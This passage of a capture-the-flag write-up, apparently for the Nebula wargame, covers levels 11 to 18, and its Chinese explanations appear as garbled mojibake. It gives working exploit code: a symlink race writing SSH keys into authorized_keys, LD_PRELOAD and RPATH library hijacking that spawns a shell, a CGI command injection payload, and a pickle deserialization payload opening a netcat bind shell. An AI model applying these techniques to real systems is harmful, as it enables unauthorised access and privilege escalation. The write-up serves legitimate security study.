æ­¤ä¹Ÿæ˜¯å­˜åœ¨åˆ©ç”¨çš„ç©ºé—´çš„ã€‚ç®¡é“å·¦å³ä¸¤ä¸ªè¿ç»­æ‰§è¡Œçš„å°ç¨‹åºï¼Œå…¶<code>time()</code>çš„è¿”å›å€¼æ˜¯å¤§æ¦‚ç‡ç›¸åŒçš„ã€‚</p><p>æ³¨æ„åˆ°flag11ç”¨æˆ·ç›®å½•ä¸‹å­˜åœ¨<code>.ssh</code>æ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ­¤æ–‡ä»¶å¤¹ä¸‹å†™å…¥æˆ‘ä»¬çš„å…¬é’¥åˆ°æ–‡ä»¶<code>authorized_keys</code>ä¸­ï¼Œå°±å¯ä»¥ç›´æ¥sshç™»å½•è‡³flag11è´¦æˆ·äº†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ç¨‹åºï¼Œåˆ›å»ºä¸€ä¸ªå’Œflag11ç¨‹åºè¦åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶åŒåçš„æ–‡ä»¶ï¼Œå°†å®ƒç¬¦å·é“¾æ¥åˆ°<code>/home/flag11/.ssh/authorized_keys</code>ï¼Œç„¶åè¾“å‡ºå†…å®¹æ„é€ ä¸ºå…¬é’¥æ–‡ä»¶å†…å®¹å³å¯ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getrand</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>path, <span style=color:#66d9ef>int</span> pid, <span style=color:#66d9ef>int</span> time)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>tmp;
  <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span>  <span style=color:#ae81ff>0</span>;

  srandom(time);

  tmp <span style=color:#f92672>=</span> getenv(<span style=color:#e6db74>&#34;TEMP&#34;</span>);
  asprintf(path, <span style=color:#e6db74>&#34;%s/%d.%c%c%c%c%c%c&#34;</span>, tmp, pid,
      <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>),
      <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>),
      <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>), <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>));


  <span style=color:#66d9ef>return</span> fd;
}


<span style=color:#75715e>#define CL &#34;Content-Length: &#34;
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> line[<span style=color:#ae81ff>256</span>];
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>2048</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ssh-rsa your public key here...&#34;</span>;

  <span style=color:#66d9ef>int</span> pid;
  <span style=color:#66d9ef>int</span> fd;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path;

  pid <span style=color:#f92672>=</span> getpid()<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>;
  getrand(<span style=color:#f92672>&amp;</span>path, pid, time(NULL));
  symlink(<span style=color:#e6db74>&#34;/home/flag11/.ssh/authorized_keys&#34;</span>,path);

  fprintf(stdout, <span style=color:#e6db74>&#34;%s%d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>%s&#34;</span>,CL,<span style=color:#66d9ef>sizeof</span>(buf),buf);

}
</code></pre></div><p>ä¹‹åå³å¯åˆ©ç”¨å¯†é’¥ç™»å½•sshï¼š</p><p><img src=level11_2.png alt=Level11></p><h2 id=level12>Level12</h2><p>é¢˜ç›®æºç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=color:#66d9ef>local</span> socket <span style=color:#f92672>=</span> require(<span style=color:#e6db74>&#34;socket&#34;</span>)
<span style=color:#66d9ef>local</span> server <span style=color:#f92672>=</span> assert(socket.bind(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>, <span style=color:#ae81ff>50001</span>))

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>hash</span>(password)
  prog <span style=color:#f92672>=</span> io.popen(<span style=color:#e6db74>&#34;echo &#34;</span><span style=color:#f92672>..</span>password<span style=color:#f92672>..</span><span style=color:#e6db74>&#34; | sha1sum&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>)
  data <span style=color:#f92672>=</span> prog:read(<span style=color:#e6db74>&#34;*all&#34;</span>)
  prog:close()

  data <span style=color:#f92672>=</span> string.sub(data, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>40</span>)

  <span style=color:#66d9ef>return</span> data
<span style=color:#66d9ef>end</span>


<span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>do</span>
  <span style=color:#66d9ef>local</span> client <span style=color:#f92672>=</span> server:accept()
  client:send(<span style=color:#e6db74>&#34;Password: &#34;</span>)
  client:settimeout(<span style=color:#ae81ff>60</span>)
  <span style=color:#66d9ef>local</span> line, err <span style=color:#f92672>=</span> client:receive()
  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> err <span style=color:#66d9ef>then</span>
      print(<span style=color:#e6db74>&#34;trying &#34;</span> <span style=color:#f92672>..</span> line) <span style=color:#75715e>-- log from where ;\</span>
      <span style=color:#66d9ef>local</span> h <span style=color:#f92672>=</span> hash(line)

      <span style=color:#66d9ef>if</span> h <span style=color:#f92672>~=</span> <span style=color:#e6db74>&#34;4754a4f4bd5787accd33de887b9250a0691dd198&#34;</span> <span style=color:#66d9ef>then</span>
          client:send(<span style=color:#e6db74>&#34;Better luck next time</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      <span style=color:#66d9ef>else</span>
          client:send(<span style=color:#e6db74>&#34;Congrats, your token is 413**CARRIER LOST**</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
      <span style=color:#66d9ef>end</span>

  <span style=color:#66d9ef>end</span>

  client:close()
<span style=color:#66d9ef>end</span>
</code></pre></div><p>å­˜åœ¨å¾ˆæ˜æ˜¾çš„å‘½ä»¤æ³¨å…¥ï¼š</p><p><img src=level12_1.png alt=Level12></p><h2 id=level13>Level13</h2><p>é¢˜ç›®æºç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#75715e>#define FAKEUID 1000
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  <span style=color:#66d9ef>int</span> c;
  <span style=color:#66d9ef>char</span> token[<span style=color:#ae81ff>256</span>];

  <span style=color:#66d9ef>if</span>(getuid() <span style=color:#f92672>!=</span> FAKEUID) {
      printf(<span style=color:#e6db74>&#34;Security failure detected. UID %d started us, we expect %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, getuid(), FAKEUID);
      printf(<span style=color:#e6db74>&#34;The system administrators will be notified of this violation</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      exit(EXIT_FAILURE);
  }

  <span style=color:#75715e>// snip, sorry :)
</span><span style=color:#75715e></span>
  printf(<span style=color:#e6db74>&#34;your token is %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, token);
  
}
</code></pre></div><p>æŸ¥çœ‹flag14ç¨‹åºçš„é‡å®šä½è¡¨ï¼Œå¯ä»¥å‘ç°<code>getuid()</code>å‡½æ•°ï¼š</p><p><img src=level13_2.png alt></p><p>è¿™é“é¢˜ç›®æ˜¯ä¸ºäº†exploit<code>getuid()</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>LD_PRELOAD</code>é¢„å…ˆåŠ è½½æˆ‘ä»¬è‡ªå·±çš„é“¾æ¥æ–‡ä»¶ï¼ŒåŠ«æŒåŸæœ¬çš„<code>getuid()</code>å‡½æ•°ã€‚</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getuid</span>()
{
	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1000</span>;
}
</code></pre></div><p>å°†å®ƒç¼–è¯‘ä¸ºåŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œï¼š</p><pre><code>$ gcc -shared -o getuid.so getuid.c

$ LD_PRELOAD=~/getuid.so /home/flag13/flag13
</code></pre><p>æ‰§è¡Œå‘ç°æ²¡æœ‰æ•ˆæœï¼Œå‘ç°<strong>LD_PRELOADè¦ç”Ÿæ•ˆï¼Œæ‰€æ‰§è¡Œçš„ç¨‹åºçš„ownerå¿…é¡»æ˜¯è¯¥ç”¨æˆ·</strong>ï¼Œæ‰€ä»¥å°†flag13æ–‡ä»¶copyä¸€ä¸‹å³å¯ï¼š</p><p><img src=level13_1.png alt=Level13></p><h2 id=level14>Level14</h2><p>æ­¤é¢˜ç•¥å¾®è¯•æ¢ä¸€ä¸‹å³å¯å‘ç°å…¶åŠ å¯†é€»è¾‘ï¼šä»ç¬¬0ä¸ªå­—ç¬¦å¼€å§‹ï¼Œæ¯ä¸ªå­—ç¬¦çš„asciiå¯¹åº”åŠ 1å³ä¸ºå¯†æ–‡ã€‚ç›´æ¥ç¼–å†™è„šæœ¬è§£å¯†ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>

plain <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>

<span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;/home/flag14/token&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>):
    cipher <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(cipher)):
        plain <span style=color:#f92672>+=</span> chr(ord(cipher[i]) <span style=color:#f92672>-</span> i)

<span style=color:#66d9ef>print</span> plain
</code></pre></div><h2 id=level15>Level15</h2><p>æŒ‰ç…§é¢˜ç›®æç¤ºï¼Œ<code>strace</code>æ¥ç›‘æ§flag15ç¨‹åºçš„ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨è¾“å‡ºä¸­å‘ç°ï¼š</p><pre><code>open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
</code></pre><p>ç¨‹åºè¯•å›¾æ‰“å¼€ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè§‚å¯Ÿæ–‡ä»¶ååƒæ˜¯åŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼ŒæŸ¥çœ‹flag15çš„ç›¸å…³ä¿¡æ¯ï¼š</p><pre><code>$ readelf -d flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 ......
</code></pre><p>å¯ä»¥å‘ç°æœ‰<code>RPATH</code>å˜é‡å€¼ä¸º<code>/var/tmp/flag15</code>ï¼ŒæŸ¥çœ‹<code>man dlopen</code>å¯ä»¥å‘ç°<code>RPATH</code>åœ¨è¿æ¥å™¨å¯»æ‰¾ç›®å½•çš„é¦–ä½ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ è‡ªå·±çš„<code>libc.so.6</code>åŠ¨æ€é“¾æ¥æ–‡ä»¶æ”¾åœ¨<code>/var/tmp/flag15</code>ç›®å½•ä¸‹ã€‚åŠ¨æ€é“¾æ¥æ–‡ä»¶è½½å…¥æ—¶ä¼šé¦–å…ˆæ‰§è¡Œ<code>_init</code>å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é‡å†™æ­¤å‡½æ•°æ¥è¾¾åˆ°ç›®çš„ã€‚ï¼ˆé‡å†™<code>__libc_start_main</code>å‡½æ•°ä¹Ÿå¯ä»¥ï¼‰</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>__attribute__((constructor)) <span style=color:#66d9ef>void</span> __myinit(<span style=color:#66d9ef>void</span>) {
	setresuid(<span style=color:#ae81ff>984</span>, <span style=color:#ae81ff>984</span>, <span style=color:#ae81ff>984</span>);
	system(<span style=color:#e6db74>&#34;/bin/bash&#34;</span>);
}
</code></pre></div><p>é‡‡ç”¨å¦‚ä¸‹æŒ‡ä»¤ç¼–è¯‘ï¼š</p><pre><code>gcc -shared -fPIC -o libc.so.6 libc1.c
</code></pre><p>è¿è¡Œflag15åå‘ç°æç¤ºï¼š</p><blockquote><p>/var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</p></blockquote><p>æŸ¥é˜…èµ„æ–™ï¼Œéœ€è¦ç¼–å†™ä¸€versionæ–‡ä»¶ï¼Œåœ¨é“¾æ¥æ—¶åŠ å…¥ç‰ˆæœ¬ä¿¡æ¯ï¼š</p><pre><code>$ cat ver
GLIBC_2.0 {};
$ gcc -shared -fPIC -o libc.so.6 -Wl,--version-script,ver libc1.c
</code></pre><p>è¿è¡Œflag15ååˆç°æç¤ºï¼š</p><blockquote><p>/var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3&rsquo; not found (required by /var/tmp/flag15/libc.so.6)</p></blockquote><p>ç»æŸ¥é˜…èµ„æ–™åï¼Œå‘ç°åŸå› å¯èƒ½ä¸ºæˆ‘ä»¬è‡ªå·±ç¼–å†™<code>libc.so.6</code>è¦†ç›–äº†åŸæœ¬çš„<code>libc.so.6</code>ï¼Œå®ƒä»…ä¼šåŠ è½½ä¸€æ¬¡ï¼›è€Œæˆ‘ä»¬è‡ªå·±ç¼–å†™çš„<code>libc.so.6</code>è¦ç”¨åˆ°æœ¬æ¥çš„<code>libc.so.6</code>çš„å‡½æ•°ï¼Œæ‰€ä»¥åœ¨è¿è¡Œçš„æ—¶å€™ä¼šæç¤ºæ‰¾ä¸åˆ°ã€‚è§£å†³æ–¹æ³•æ˜¯åœ¨ç¼–è¯‘<code>libc.so.6</code>çš„æ—¶å€™é‡‡ç”¨é™æ€é“¾æ¥çš„æ–¹æ³•ã€‚</p><pre><code>gcc -shared -fPIC -o libc.so.6 -static-libgcc -Wl,--version-script,ver,-Bstatic libc1.c
</code></pre><p>ä¹‹åå³å¯æ­£ç¡®è¿è¡Œflag15ç¨‹åºï¼Œæ‹¿åˆ°shellã€‚</p><h2 id=level16>Level16</h2><p>é¢˜ç›®æºç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=color:#75715e>#!/usr/bin/env perl</span>

<span style=color:#66d9ef>use</span> CGI <span style=color:#e6db74>qw{param}</span>;

<span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Content-type: text/html\n\n&#34;</span>;

<span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>login</span> {
  $username <span style=color:#f92672>=</span> $_[<span style=color:#ae81ff>0</span>];
  $password <span style=color:#f92672>=</span> $_[<span style=color:#ae81ff>1</span>];

  $username <span style=color:#f92672>=~</span> tr<span style=color:#e6db74>/a-z/</span>A<span style=color:#f92672>-</span>Z<span style=color:#f92672>/</span>; <span style=color:#75715e># conver to uppercase</span>
  $username <span style=color:#f92672>=~</span> <span style=color:#e6db74>s/\s.*//</span>;        <span style=color:#75715e># strip everything after a space</span>

  @output <span style=color:#f92672>=</span> <span style=color:#e6db74>`egrep &#34;^$username&#34; /home/flag16/userdb.txt 2&gt;&amp;1`</span>;
  <span style=color:#66d9ef>foreach</span> $line (@output) {
      ($usr, $pw) <span style=color:#f92672>=</span> split(<span style=color:#e6db74>/:/</span>, $line);
  

      <span style=color:#66d9ef>if</span>($pw <span style=color:#f92672>=~</span> $password) {
          <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
      }
  }

  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}

<span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>htmlz</span> {
  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&#34;</span>);
  <span style=color:#66d9ef>if</span>($_[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Your login was accepted&lt;br/&gt;&#34;</span>);
  } <span style=color:#66d9ef>else</span> {
      <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Your login failed&lt;br/&gt;&#34;</span>);
  }    
  <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>&#34;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&#34;</span>);
}

htmlz(login(param(<span style=color:#e6db74>&#34;username&#34;</span>), param(<span style=color:#e6db74>&#34;password&#34;</span>)));
</code></pre></div><p>ç”±æºç å¯ä»¥çœ‹å‡ºï¼Œæ­¤é¢˜åº”è¯¥æ˜¯<strong>å‘½ä»¤æ³¨å…¥</strong>ï¼Œä½†å¯¹è¾“å…¥çš„å˜é‡åšäº†é™åˆ¶ï¼š</p><ul><li>å°†æ‰€æœ‰çš„å°å†™å­—æ¯è½¬åŒ–ä¸ºå¤§å†™å­—æ¯</li><li>å°†ç©ºç™½å­—ç¬¦åŠå…¶åé¢çš„å­—ç¬¦å…¨éƒ¨åˆ æ‰</li></ul><p>ä¸€èˆ¬çš„å‘½ä»¤éƒ½è¦æ±‚è¾“å…¥å‚æ•°ï¼Œè¿™å°±è¦ç”¨ç©ºæ ¼éš”å¼€ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥æ³¨å…¥å‘½ä»¤ï¼Œè€ƒè™‘å°†å‘½ä»¤å†™å…¥è„šæœ¬ï¼Œç„¶åæ‰§è¡Œï¼›ä½†æ˜¯å¹¶æ²¡æœ‰å¯¹æ ¹ç›®å½•çš„å†™å…¥æƒé™ï¼Œè€Œæ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤¹éƒ½æ˜¯å°å†™ï¼Œæ‰€ä»¥å°±éœ€è¦è€ƒè™‘ä¸€ç§ç»•è¿‡æ–¹æ³•ã€‚</p><p>å°†å¦‚ä¸‹è„šæœ¬å†™å…¥<code>/tmp/SHELL</code>ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>nc.traditional -nlp <span style=color:#ae81ff>9999</span> -e /bin/bash
</code></pre></div><p>ç„¶åå¯ä»¥ç”¨<code>/*/SHELL</code>æ¥è®¿é—®åˆ°å®ƒï¼Œè¿™å°±ç»•è¿‡äº†å¤§å†™è½¬æ¢ã€‚ç»™æ­¤è„šæœ¬å¢åŠ æ‰§è¡Œæƒé™ï¼Œç„¶åè®¿é—®ï¼š</p><pre><code>http://your-ip:1616/index.cgi?username=$(/*/SHELL)
</code></pre><p>ç„¶åç›´æ¥è¿æ¥ncæ‰€ç›‘å¬ç«¯å£ï¼Œè·å–shellã€‚</p><p>ps. å¦ä¸€ç§ç»•è¿‡æ–¹æ³•æ˜¯åˆ©ç”¨shellè‡ªèº«çš„<a href=http://wiki.bash-hackers.org/syntax/pe#case_modification>case modification</a>ï¼Œå…ˆå®šä¹‰ä¸€å˜é‡ï¼Œç„¶ååœ¨å¼•ç”¨è¯¥å˜é‡çš„æ—¶å€™åˆ©ç”¨<code>${var,,}</code>æ¥å°†å¤§å†™å­—æ¯è½¬åŒ–ä¸ºå°å†™ã€‚</p><h2 id=level17>Level17</h2><p>é¢˜ç›®æºç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>

<span style=color:#f92672>import</span> os
<span style=color:#f92672>import</span> pickle
<span style=color:#f92672>import</span> time
<span style=color:#f92672>import</span> socket
<span style=color:#f92672>import</span> signal

signal<span style=color:#f92672>.</span>signal(signal<span style=color:#f92672>.</span>SIGCHLD, signal<span style=color:#f92672>.</span>SIG_IGN)

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>server</span>(skt):
  line <span style=color:#f92672>=</span> skt<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)

  obj <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>loads(line)

  <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> obj:
      clnt<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;why did you send me &#34;</span> <span style=color:#f92672>+</span> i <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)

skt <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM, <span style=color:#ae81ff>0</span>)
skt<span style=color:#f92672>.</span>bind((<span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, <span style=color:#ae81ff>10007</span>))
skt<span style=color:#f92672>.</span>listen(<span style=color:#ae81ff>10</span>)

<span style=color:#66d9ef>while</span> True:
  clnt, addr <span style=color:#f92672>=</span> skt<span style=color:#f92672>.</span>accept()

  <span style=color:#66d9ef>if</span>(os<span style=color:#f92672>.</span>fork() <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>):
      clnt<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;Accepted connection from </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (addr[<span style=color:#ae81ff>0</span>], addr[<span style=color:#ae81ff>1</span>]))
      server(clnt)
      exit(<span style=color:#ae81ff>1</span>)
</code></pre></div><h3 id=pythonçš„pickleåº“ååºåˆ—åŒ–æ¼æ´>pythonçš„pickleåº“ååºåˆ—åŒ–æ¼æ´</h3><p>æ­¤é¢˜æ˜¯pythonçš„pickleåºåˆ—åŒ–åº“çš„ç‰¹æ€§ï¼Œå®ƒå¯èƒ½ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>pickleåº“èƒ½åºåˆ—åŒ–å¤§å¤šæ•°å¯¹è±¡ï¼ŒåŒ…æ‹¬ç”¨æˆ·è‡ªå®šä¹‰çš„ç±»ã€‚å®ƒçš„åºåˆ—åŒ–å‡½æ•°æœ‰ä¸¤ä¸ªï¼š</p><ul><li><code>pickle.load(obj, file, protocol=None, *, fix_imports=True)</code>ï¼šè¯¥æ–¹æ³•å°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚ï¼ˆbytesï¼‰è¾“å‡ºåˆ°fileæ–‡ä»¶ä¸­ã€‚</li><li><code>pickle.loads(obj, protocol=None, *, fix_imports=True)</code>ï¼šè¯¥æ–¹æ³•å°†objå¯¹è±¡åºåˆ—åŒ–å¹¶è¿”å›ä¸€ä¸ªbyteså¯¹è±¡ã€‚</li></ul><p>ååºåˆ—åŒ–å‡½æ•°å¯¹åº”ä¹Ÿæœ‰ä¸¤ä¸ªï¼š</p><ul><li><code>pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict")</code>ï¼šä»ä¸€ä¸ªå¯¹è±¡æ–‡ä»¶ä¸­è¯»å–åºåˆ—åŒ–æ•°æ®ï¼Œå°†å…¶ååºåˆ—åŒ–ä¹‹åè¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚</li><li><code>pickle.loads(bytes_object, *, fix_imports=True, encoding="ASCII", errors="strict")</code>ï¼šå°†ä¸€ä¸ªbyteså¯¹è±¡ååºåˆ—åŒ–å¹¶è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚</li></ul><p>å¯¹äºä¸€ä¸ªç±»æ¥è¯´ï¼Œå…¶<code>__reduce__()</code>æ–¹æ³•åœ¨ååºåˆ—åŒ–æ—¶æ˜¯ä¼šè¢«æ‰§è¡Œçš„ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…å…ƒç»„æ¥æè¿°å½“ååºåˆ—åŒ–çš„æ—¶å€™è¯¥å¦‚ä½•é‡æ„ã€‚</p><h3 id=payload>payload</h3><p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨<code>__reduce__()</code>æ–¹æ³•æ¥get shellã€‚ç¼–å†™pythonè„šæœ¬ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
<span style=color:#75715e>#coding=utf-8</span>

<span style=color:#f92672>import</span> pickle
<span style=color:#f92672>import</span> os

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>poc</span>(object):
	<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
		s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;nc.traditional -nlp 9999 -e /bin/bash&#34;</span>
		<span style=color:#75715e>#s = &#39;echo abcdefg&#39;</span>
		<span style=color:#66d9ef>return</span> os<span style=color:#f92672>.</span>system, (s,)

e <span style=color:#f92672>=</span> poc()
s <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(e)
<span style=color:#66d9ef>print</span> s
</code></pre></div><p>è¿è¡Œç„¶åè¿æ¥ncç«¯å£ï¼š</p><p><img src=level17_1.png alt=Level17></p><h2 id=level18>Level18</h2><p>é¢˜ç›®æºç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
